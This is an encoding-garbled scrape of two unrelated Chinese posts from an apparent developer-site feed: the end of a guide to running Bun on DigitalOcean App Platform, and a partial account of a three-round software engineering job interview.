<p>â€‹<strong>ç‰ˆæœ¬é€‰æ‹©è§„åˆ™</strong>â€‹ï¼š</p>
<ul>
<li>è¯»å– BUN_VERSION ç¯å¢ƒå˜é‡</li>
<li>è¯»å– .bun-version æ–‡ä»¶</li>
<li>è¯»å– .runtime.bun.txt æ–‡ä»¶</li>
<li>å¦‚æœä»¥ä¸Šéƒ½æ²¡æŒ‡å®šï¼Œå°±ç”¨ Bun GitHub Releases çš„æœ€æ–°ç‰ˆæœ¬</li>
</ul>
<p>ç³»ç»Ÿä¼šç¼“å­˜ä½ ä½¿ç”¨çš„ Bun å’Œ Node ç‰ˆæœ¬ï¼Œåªè¦ç‰ˆæœ¬ä¸å˜ï¼Œåç»­æ„å»ºéƒ½ä¼šæ›´å¿«ã€‚åªæœ‰å½“ä½ ä¸»åŠ¨ä¿®æ”¹ç‰ˆæœ¬æ—¶ï¼Œç³»ç»Ÿæ‰ä¼šé‡æ–°è·å–ã€‚</p>
<h2 data-id="heading-4">ä» Node.js è¿ç§»åˆ° Bun</h2>
<p>å¦‚æœä½ æƒ³å°†ç°æœ‰çš„ Node.js åº”ç”¨è½¬ä¸ºä½¿ç”¨ Bun è¿è¡Œæ—¶ï¼Œè¿‡ç¨‹å…¶å®å¾ˆç®€å•ã€‚ä¸éœ€è¦ä¿®æ”¹åº”ç”¨ä»£ç ï¼Œåªéœ€è°ƒæ•´é¡¹ç›®é…ç½®ã€‚</p>
<p>ç¬¬ä¸€æ­¥ï¼šæ¸…ç† Node é…ç½®æ–‡ä»¶ åˆ é™¤é¡¹ç›®ä¸­çš„ package-lock.jsonï¼ˆæˆ– yarn.lockï¼‰ã€‚è¿™ä¸ªæ“ä½œç›¸å½“äºå‘Šè¯‰åº”ç”¨æ‰˜ç®¡æœåŠ¡ï¼ˆApp Platformï¼‰ï¼šâ€œä¸è¦å†æŠŠè¿™ä¸ªåº”ç”¨å½“æˆæ ‡å‡† Node åº”ç”¨æ¥å¤„ç†äº†ã€‚â€</p>
<p>ç¬¬äºŒæ­¥ï¼šç”Ÿæˆ Bun é…ç½®æ–‡ä»¶ åœ¨æœ¬åœ°è¿è¡Œ bun installã€‚è¿™ä¼šè‡ªåŠ¨ç”Ÿæˆ bun.lock æ–‡ä»¶ã€‚</p>
<p>ç¬¬ä¸‰æ­¥ï¼šæäº¤æ›´æ–°</p>
<p>å°†æ”¹åŠ¨æäº¤åˆ°ä»£ç ä»“åº“ã€‚åº”ç”¨æ‰˜ç®¡æœåŠ¡ï¼ˆApp Platformï¼‰æ£€æµ‹åˆ°æ–°æäº¤åï¼Œå°±ä¼šè‡ªåŠ¨åˆ‡æ¢â€”â€”ä¸å†ä½¿ç”¨ Node æ„å»ºæµç¨‹ï¼Œè½¬è€Œä½¿ç”¨ Bun çš„æ„å»ºæµç¨‹ã€‚</p>
<h2 data-id="heading-5">ä»…æŠŠ Bun å½“åŒ…ç®¡ç†å™¨</h2>
<p>å¦‚æœä½ æƒ³ç”¨ Bun ä½œä¸ºåŒ…ç®¡ç†å™¨ï¼Œä½†ç»§ç»­ä½¿ç”¨ Node.js ä½œä¸ºè¿è¡Œæ—¶ï¼Œç³»ç»Ÿä¼šåœ¨ä»¥ä¸‹æƒ…å†µè‡ªåŠ¨å®‰è£… Node.jsï¼š</p>
<p>å¦‚æœåœ¨ package.json ä¸­å°† Bun æŒ‡å®šä¸ºåŒ…ç®¡ç†å™¨ã€‚è¯·æŒ‰å¦‚ä¸‹æ–¹å¼æ›´æ–°ä½ çš„ package.jsonï¼š</p>
<pre><code class="hljs language-perl" lang="perl">{

  <span class="hljs-string">"packageManager"</span>: <span class="hljs-string">"bun@1.2.0"</span>

}
</code></pre>
<p>å¦‚æœ package.json ä¸­æœ‰è„šæœ¬åŒ…å« node å‘½ä»¤ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ ·ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>

  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>

    <span class="hljs-attr">"start"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node src/index.js"</span>

  <span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">}</span>
</code></pre>
<p>å¦‚æœå°† Bun ç”¨ä½œåŒ…ç®¡ç†å™¨ï¼Œé»˜è®¤ä¼šå®‰è£…å¹¶ä½¿ç”¨ Node.js v22.x ç‰ˆæœ¬ã€‚å¦‚éœ€æŒ‡å®š Node.js ç‰ˆæœ¬ï¼Œå¯ä»¥åœ¨ package.json çš„ engines å­—æ®µä¸­å®šä¹‰ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>

  <span class="hljs-attr">"engines"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>

    <span class="hljs-attr">"node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"23.x"</span>

  <span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-6">Next.js é…ç½®</h2>
<p>ä½¿ç”¨ Bun è¿è¡Œæ—¶ä¹Ÿèƒ½åœ¨åº”ç”¨æ‰˜ç®¡æœåŠ¡ï¼ˆApp Platformï¼‰ä¸Šéƒ¨ç½² Next.js åº”ç”¨ã€‚å¦‚æœä½ è¦éƒ¨ç½² Next.js é¡¹ç›®ï¼ˆåŒ…æ‹¬ä½¿ç”¨äº† ISR çš„é¡¹ç›®ï¼‰ï¼Œå¿…é¡»æ›´æ–°è„šæœ¬é…ç½®ï¼Œæ˜ç¡®æŒ‡å®šåœ¨æ„å»ºå’Œå¼€å‘æµç¨‹ä¸­ä½¿ç”¨ Bun è¿è¡Œæ—¶ã€‚</p>
<p>è¯·æŒ‰ä»¥ä¸‹æ–¹å¼æ›´æ–° package.jsonï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>

  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>

    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"bun --bun next dev"</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">//or remove this line, as app platform uses the build script</span>

    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"bun --bun next build"</span>

  <span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">}</span>
</code></pre>
<p>è¿™æ ·å¯ä»¥ç¡®ä¿ Next.js åœ¨ åº”ç”¨æ‰˜ç®¡æœåŠ¡ï¼ˆApp Platformï¼‰ çš„æ„å»ºè¿‡ç¨‹ä¸­æ­£ç¡®è°ƒç”¨ Bun çš„è¿è¡Œæ—¶åŠŸèƒ½ã€‚</p>
<p>DigitalOcean åº”ç”¨æ‰˜ç®¡æœåŠ¡ï¼ˆApp Platformï¼‰ç°å·²åœ¨å…¨çƒæ‰€æœ‰åŒºåŸŸæä¾›åŸç”Ÿ Bun æ”¯æŒã€‚</p>
<ul>
<li>â€‹<strong>æ–°å»ºåº”ç”¨</strong>â€‹ï¼šå…³è”åŒ…å« bun.lockb çš„ GitHub ä»“åº“å³å¯ã€‚</li>
<li>â€‹<strong>ç°æœ‰åº”ç”¨</strong>â€‹ï¼šåˆ‡æ¢åŒ…ç®¡ç†å™¨å¹¶æ¨é€ï¼Œè§¦å‘æ–°æ„å»ºå³å¯è‡ªåŠ¨ä½¿ç”¨ Bunã€‚</li>
</ul>
<p>æ›´å¤šé«˜çº§é…ç½®è¯·å‚è€ƒ DigitalOcean è‹±æ–‡å®˜ç½‘ Bun Buildpack æ–‡æ¡£ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.digitalocean.com%2Fproducts%2Fapp-platform%2Freference%2Fbuildpacks%2Fbun" target="_blank" title="https://docs.digitalocean.com/products/app-platform/reference/buildpacks/bun" ref="nofollow noopener noreferrer">docs.digitalocean.com/products/apâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ£®æœäº‘é¢è¯•ç»å†]]></title>    <link>https://juejin.cn/post/7588971908227547170</link>    <guid>https://juejin.cn/post/7588971908227547170</guid>    <pubDate>2025-12-29T07:31:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588971908227547170" data-draft-id="7588999772749479971" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ£®æœäº‘é¢è¯•ç»å†"/> <meta itemprop="keywords" content="é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-29T07:31:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°å…µå¼ å¥"/> <meta itemprop="url" content="https://juejin.cn/user/1257497032405229"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ£®æœäº‘é¢è¯•ç»å†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1257497032405229/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°å…µå¼ å¥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:31:40.000Z" title="Mon Dec 29 2025 07:31:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸Šé¢åˆšåˆšé¢è¯•å®Œæ£®æœäº‘ï¼Œ2å°æ—¶48åˆ†ï¼Œæ¥è¿‘ 3 ä¸ªå°æ—¶ï¼Œæœ‰ç‚¹ç‰¹åˆ«çš„ä¸€å®¶å…¬å¸ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p>
<p>æ•´ä¸ªé¢è¯•æœ‰ä¸‰è½®ã€‚</p>
<h3 data-id="heading-0">ä¸€é¢</h3>
<p>ä¸€é¢æŠ€æœ¯é¢é—®ä¸€ä¸‹åŸºç¡€çš„å’ŒæŠ€æœ¯ç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼Œæˆ‘æ˜¯ç²¾é€š Java ç†Ÿæ‚‰ Pythonï¼Œé¢è¯•çš„å²—ä½æ˜¯ Python å·¥ç¨‹å¸ˆã€‚æ‰€ä»¥å’Œ Python ä¸€äº›åº•å±‚ç›¸å…³çš„æˆ‘ä¸çŸ¥é“ï¼Œä½†æ˜¯æˆ‘å¯ä»¥é€šè¿‡å¤§è‡´çš„æ€è·¯ï¼Œè®²è§£æ•´ä¸ªæµç¨‹ï¼Œä¸€é¢æœ‰ä¸ªéå¸¸å¥½çš„ä½“éªŒæ˜¯ï¼Œå¦‚æœå“ªé‡Œå›ç­”é”™äº†æˆ–è€…æ²¡ç­”å‡ºæ¥ï¼Œé¢è¯•å®˜ä¼šç›´æ¥å‘Šè¯‰æˆ‘ã€‚</p>
<p>æˆ‘å›å¿†ç€æœ‰è¿™ä¹ˆå‡ ä¸ªé—®é¢˜ã€‚</p>
<h5 data-id="heading-1">Python æµ®ç‚¹æ•°è®¡ç®—å¦‚ä½•ä¿è¯ç²¾åº¦</h5>
<p>æ¯”å¦‚ 0.11 - 0.1ï¼Œè¿™ä¸ªåŸç†æ˜¯äºŒè¿›åˆ¶å­˜å°æ•°æœ‰ç²¾åº¦ä¸¢å¤±é—®é¢˜ï¼Œæˆ‘å›ç­”è¯´è¦ä¹ˆéƒ½ä¹˜ä»¥ 100 éƒ½è½¬æˆæ•´æ•°è®¡ç®—ï¼Œè¦ä¹ˆç”¨ decimal ç±»å‹åŒ…è£…ä¸€ä¸‹ã€‚</p>
<p>å…¶å®æˆ‘çš„ç¡®ä¸çŸ¥é“ Python çš„ï¼Œä½†æ˜¯åœ¨å‰ç«¯ã€MySQL è¿™äº›åœ°æ–¹ï¼Œä¹ŸåŒæ ·é¢å¯¹ç±»ä¼¼çš„é—®é¢˜ï¼Œå°¤å…¶æ˜¯å’Œé’±ç›¸å…³çš„ï¼ŒåŸºæœ¬ä¸Šå°±è¿™ä¸¤ç§è§£å†³æ–¹æ¡ˆã€‚</p>
<h5 data-id="heading-2">å¤šæ€æ˜¯ä»€ä¹ˆ</h5>
<p>å¦ç‡çš„è®²å¿˜äº†ï¼Œä½†æ˜¯æˆ‘æ‰¯åˆ°äº†ä¸‹è®¾è®¡æ¨¡å¼å’Œ 5 å¤§è®¾è®¡åŸåˆ™ï¼Œè®²äº†ä¸‹åœ¨çœŸå®åœºæ™¯çš„è¿ç”¨ï¼Œå…¶ä¸­è¯´åˆ°äº†ç­–ç•¥æ¨¡å¼ã€‚æ­£å¥½è¿™ä¸ªå°±æ˜¯å¤šæ€çš„ä½“ç°ï¼Œæœ€ç»ˆè™½ç„¶æ²¡å›ç­”å‡ºæ¥ï¼Œä½†ç»™é¢è¯•å®˜ä½“ç°çš„æ˜¯å·²ç»åœ¨ç”¨äº†ï¼Œåªæ˜¯æ²¡è¯´å‡ºæ¥å®šä¹‰ã€‚</p>
<h5 data-id="heading-3">Python äº FastAPI çš„åŠŸèƒ½ç‚¹</h5>
<p>åƒ GILã€å•çº¿ç¨‹å¤šçº¿ç¨‹ã€asyncIOã€ä¸­é—´ä»¶ç­‰ç­‰ï¼Œè¿™äº›ä¸œè¥¿æˆ‘ä¹‹å‰å†™äº†å››ç¯‡æ–‡ç« å’Œ Java + Spring æœ‰å¯¹ç…§ï¼Œå›ç­”è¿™äº›éƒ½æ²¡é—®é¢˜ã€‚</p>
<h5 data-id="heading-4">å¼€æ”¾é¢˜ï¼ŒéšæœºæŠ½å– 1-100ï¼Œå¦‚ä½•è®© 1-50 çš„æ¦‚ç‡æ˜¯ 51-100 çš„ 2å€ï¼Ÿ</h5>
<p>æˆ‘è¯´åœ¨åˆ—è¡¨é‡Œé¢æ”¾ä¸¤é 1-50 ğŸ¤£ğŸ¤£ï¼Œé¢è¯•å®˜è¯´å¤ªç®€å•äº†ï¼Œæ¢ä¸ªã€‚</p>
<p>äºæ˜¯æˆ‘æ¢äº†ç§æ€è·¯ï¼ŒæŠŠæ€»ä½“çš„æ¦‚ç‡è®¾è®¡ä¸º 1ï¼Œç›¸å½“äºæ˜¯å§åŸæ¥ 0.5:0.5 çš„å¹³è¡¡è½¬ä¸º 0.67ï¼š0.33ï¼Œé‚£åœ¨æŠ½ä¸­ 51-100 çš„ 0.5 æ¦‚ç‡ä¸­ï¼ŒæŠŠå…¶ä¸­çš„ 0.16 ç®—ä½œ 1-50ï¼Œä¹Ÿå°±æ˜¯æŠ½ä¸­ 51 - 100 çš„æ—¶å€™å†è®¡ç®—ä¸€éæ¦‚ç‡ï¼Œå¦‚æœæ˜¯ 0.16/0.5 åˆ™ç®—åš 1-50ï¼Œå¦åˆ™æ˜¯ 51 -100ã€‚</p>
<p>ä½†æ˜¯æˆ‘è¿™é‡Œæ²¡è§£é‡Šæ¸…æ¥šï¼Œé¢è¯•å®˜æ²¡ç†è§£ï¼Œåæ¥ AI é—®äº†ä¸‹ï¼Œä¹Ÿå¯ä»¥å‰ç½®ç°åœ¨ 1 2 3 ä¸­æŠ½ä¸€æ¬¡ï¼ŒæŠ½ä¸­äº† 1 2 å†å» 1 - 50 ä¸­æŠ½ï¼ŒæŠ½ä¸­äº† 3 å» 51 - 100 ä¸­æŠ½ã€‚</p>
<p>è¿˜èŠåˆ°äº† AI ç›¸å…³çš„å†…å®¹ï¼Œå’ŒäºŒé¢æœ‰é‡å ï¼Œæˆ‘æ”¾åˆ°äºŒé¢é‡Œé¢è¯´ã€‚</p>
<p>æ€»ä¹‹ä¸€é¢çš„ç›®çš„æ˜¯ç­›é€‰æŠ€æœ¯åˆæ ¼çš„ï¼Œæœ‰å·¥ç¨‹å¸ˆæ€ç»´çš„ï¼Œæ²¡å¤ªå±€é™è¯­è¨€ã€‚è¯è¯´å›æ¥è¯­è¨€éƒ½æ˜¯ç›¸é€šçš„ï¼Œæˆ‘è®¤ä¸ºç²¾é€šæŸä¸€é—¨è¯­è¨€ï¼Œ3 ä¸ªæœˆæ—¶é—´å°±å¯ä»¥ç²¾é€šå¦ä¸€é—¨ã€‚</p>
<h3 data-id="heading-5">äºŒé¢</h3>
<p>æ¥ç€æ˜¯äºŒé¢ï¼Œæ˜¯è¿™è¾¹çš„æŠ€æœ¯è´Ÿè´£äººï¼Œæˆ‘ä»¬å…ˆèŠäº† AIï¼Œè¿™å®¶å…¬å¸å¸Œæœ›æ‹›è˜åˆ°å¯¹ AI æœ‰ç†è§£ï¼Œèƒ½å¸¦é¢†å›¢é˜Ÿåš AI èµ‹èƒ½äº§ç ”ææ•ˆï¼Œæˆ‘æ­£å¥½æœ‰ç›¸å…³çš„ç»éªŒï¼Œæˆ‘ä¹Ÿåœ¨ä¹‹å‰çš„æ–‡ç« é‡Œé¢æŠŠæ€è·¯å’Œæµç¨‹éƒ½å†™äº†ã€‚</p>
<p>è¿™æ˜¯ä¸ªæ¯”è¾ƒç¨€å°‘çš„ç»éªŒï¼Œè™½ç„¶ç°åœ¨ AI éå¸¸ç«çƒ­ï¼Œä½†å¤§éƒ¨åˆ†äººéƒ½åªç”¨äºå†™ä»£ç ï¼Œè¿™æ ·çš„ææ•ˆéå¸¸æœ‰é™ã€‚äºæ˜¯æˆ‘æŠŠä¹‹å‰åšæµç¨‹ææ•ˆçš„æ¡ˆä¾‹æ¼”ç¤ºäº†ä¸€éï¼Œä»æ•´ä¸ªæµç¨‹å±‚é¢è®© AI ææ•ˆæ›´å¤šã€‚</p>
<p><strong>å…¶å®è¿™é‡Œåªç”¨æŠ“ä½ä¸€ä¸ªæ ¸å¿ƒï¼Œä¸šåŠ¡éœ€æ±‚åœ¨äººçš„è„‘å­é‡Œé¢ï¼Œè¦ç»™ AI åšå®æ–½ï¼Œå°±è¦ä»¥ AI èƒ½å¬æ‡‚çš„æ–¹å¼å‘Šè¯‰ AIã€‚</strong></p>
<p>æ‰€æœ‰çš„è§„èŒƒã€æç¤ºè¯ã€æµç¨‹ï¼Œéƒ½æ˜¯ä¸ºäº†æ›´åˆ‡åˆ AI ä¸ºç›®çš„å®ç°çš„ã€‚</p>
<h5 data-id="heading-6">åŸºæœ¬çš„æ•°æ®ç»“æ„å’Œç®—æ³•</h5>
<p>åƒæ˜¯ Setã€Mapã€List è¿™äº›ï¼Œæˆ‘åˆ†åˆ«è¯´äº†è¿™äº›ï¼Œå†è¯´äº†ä»¥æ­¤ä¸ºåŸºç¡€çš„æ‰©å±•ï¼Œåƒæ˜¯ hashMap LinkedListç­‰ç­‰ã€‚</p>
<h5 data-id="heading-7">æ€ä¹ˆå®ç° LRU ç®—æ³•å®ç°ï¼Œæœ€è¿‘æœ€é¢‘ç¹ä½¿ç”¨ã€‚</h5>
<p>æˆ‘è¯´ç”¨ä¸¤ä¸ª Mapï¼Œä¸€ä¸ª k æ˜¯æ—¶é—´æˆ³ï¼Œå­˜ Valueï¼Œå¦ä¸€ä¸ª K æ˜¯ Value å­˜æ¬¡æ•°ã€‚å†åˆ†åˆ«è¯´æ˜äº†åœ¨æ–°å¢ã€åˆ é™¤ã€æ’åºçš„ä¸¤ä¸ª Map æ€ä¹ˆæ“ä½œã€‚</p>
<h5 data-id="heading-8">åœ¨ç§’æ€åœºæ™¯ï¼Œæ¯”å¦‚ 1w QPS æŠ¢ 5 ä¸ªå•†å“çš„æ—¶å€™ï¼Œç³»ç»Ÿæ€ä¹ˆè®¾è®¡ã€‚</h5>
<p>æˆ‘å›ç­”ä»å‰ç«¯é¡µé¢å¼€å§‹åšå¥½é™é¢‘ï¼Œåœ¨è¯·æ±‚æ‰“å…¥åç«¯åç”¨ Redis æ‰¿æ¥ï¼Œæ¥ç€åˆ†ä¸¤ç§æƒ…å†µï¼Œè¦ä¹ˆæ˜¯ä¸€ç‚¹éƒ½ä¸å…è®¸è¶…å–ï¼ŒæŠŠå¤§é‡è¯·æ±‚é€šè¿‡ Kafka åšæˆé¡ºåºçš„ï¼Œåªæ¶ˆè´¹å‰ 5 ä¸ªï¼›è¦ä¹ˆæ˜¯å…è®¸è¶…å–ï¼ŒæŠŠåä¹°çš„äººè‡ªåŠ¨é€€æ¬¾ã€‚æ ¸å¿ƒæ˜¯ä¸èƒ½è®©æ•°æ®åº“ä¸€æ¬¡æ€§æ¥æ”¶è¿‡é‡è¯·æ±‚æ‰“å´©äº†ã€‚</p>
<h5 data-id="heading-9">å¼€æ”¾é¢˜ï¼Œé«˜å¾·åœ°å›¾çš„çº¢ç»¿ç¯è¯»ç§’å€’æ•°æ€ä¹ˆè®¾è®¡</h5>
<p>æˆ‘è¯´è·¯æ”¿å’Œå¸‚æ”¿è¿™äº›ä¼šæœ‰æ•°æ®ç»™é«˜å¾·ï¼Œæ ¸å¿ƒæ˜¯è§£å†³ä¸å‡†çš„é—®é¢˜ã€‚å¯ä»¥é€šè¿‡æ£€æµ‹å¯¼èˆªæ¯”å¦‚åŸæœ¬æ˜¯ 30s å€’è®¡æ—¶ï¼Œä½†å¤§å®¶åœ¨ 10s éƒ½èµ°äº†ï¼Œè¯´æ˜è¿™é‡Œå¯èƒ½æœ‰é—®é¢˜ï¼ŒæŠŠè¿™äº›é—®é¢˜ä¸ŠæŠ¥åšè¿›ä¸€æ­¥å¤„ç†ã€‚</p>
<p>å¦ä¸€ä¸ªæœ‰äº›çº¢ç»¿ç¯åœ¨æ¯å¤©ä¸åŒçš„æ—¶é—´æ®µçš„å€’æ•°æ˜¯ä¸ä¸€æ ·çš„ï¼Œåœ¨æ—©æ™šé«˜å³°å’Œå¹³æ—¶æœ‰å·®å¼‚ï¼Œå°±åšä¸ªæ¯”å¦‚ä»¥å¤©ä¸ºå•ä½çš„ç­–ç•¥ã€‚</p>
<p>ä¸€é¢èŠçš„æ›´å¤šæ˜¯æŠ€æœ¯ç»†èŠ‚ï¼ŒäºŒé¢èŠçš„æ˜¯æŠ€æœ¯æ•´ä½“ï¼Œæ¶æ„ã€æ–¹æ¡ˆæ€ä¹ˆè®¾è®¡ä¹‹ç±»çš„ï¼Œæˆ‘è§‰å¾—äºŒé¢æ¯”ä¸€é¢æ›´ç®€å•äº›ã€‚</p>
<h3 data-id="heading-10">ä¸‰é¢</h3>
<p>æ¥ç€åˆ°äº†ä¸‰é¢ï¼Œä¸‰é¢æ˜¯ CEO é¢ï¼Œæˆ‘åœ¨æ¥å…¬å¸å‰è°ƒç ”äº†å…¬å¸çš„æƒ…å†µï¼ŒåŒ…æ‹¬èèµ„ã€åˆ›å§‹äººé‡‡è®¿ç­‰ã€‚ç°åœ¨çš„ CEO æ˜¯è”åˆåˆ›å§‹äººä¹‹ä¸€ã€‚</p>
<p>è¿™æ˜¯ä¸€å®¶ ToB æ–¹å‘çš„å…¬å¸ï¼Œåšæœè”¬æ•°å­—åŒ–çš„ï¼Œæ•´ä½“èŠ‚å¥æ¯”è¾ƒæ…¢ï¼Œåšçš„äº‹æƒ…ä¹ŸçœŸå®æœ‰ä»·å€¼ï¼ŒåŒºåˆ«äºäº’è”ç½‘æå¿«é’±é‚£ç§æ¨¡å¼ã€‚è¿™ä¹Ÿæ˜¯æˆ‘æ¯”è¾ƒæ¬£èµçš„ä¸€ç‚¹ã€‚</p>
<p>CEO è¡¨æ˜å¸Œæœ›ä»¥åˆä¼™äººçš„å§¿æ€æ‹›äººï¼Œå¯ä»¥æ„Ÿå—åˆ°ä¸€äºŒä¸‰é¢å¯¹äººä¸åŒè§’åº¦çš„å®¡è§†ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿåˆ‡æ¢ä¸åŒçš„æ€ç»´æ¥å›å¤ã€‚</p>
<h5 data-id="heading-11">å­¦å†å¯¹æˆ‘æ±‚èŒçš„å½±å“</h5>
